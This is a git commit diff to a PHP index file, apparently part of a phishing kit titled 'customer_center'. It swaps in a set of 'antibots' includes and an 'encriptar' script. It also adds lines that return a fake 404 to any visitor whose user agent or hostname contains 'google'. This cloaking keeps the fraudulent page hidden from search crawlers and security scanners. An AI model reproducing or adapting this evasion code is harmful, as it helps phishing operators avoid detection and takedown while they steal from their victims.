b449e4848c231453e3ff2823287368df6a505f27
Aht-crew <39540991+Aht-crew@users.noreply.github.com>
2018-11-20 12:50:09 +0100

    customer_center
    customer_center

--- index.php
+++ index.php
@@ -28,10 +28,16 @@
 session_start();
 error_reporting(0);
 //------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
-include "./antibots1.php";
-include "./antibots2.php";
-include "./antibots3.php";
-include "./antibots4.php";
+include "../BOTS/antibots1.php";
+include "../BOTS/antibots2.php";
+include "../BOTS/antibots3.php";
+include "../BOTS/antibots4.php";
+include "../BOTS/encriptar.php";
+include "../.htaccess.htaccess";
 //----------------------------------------------------------------------------------------------------------------//
+if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+//----------------------------------------------------------------------------------------------------------------//
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 ?>
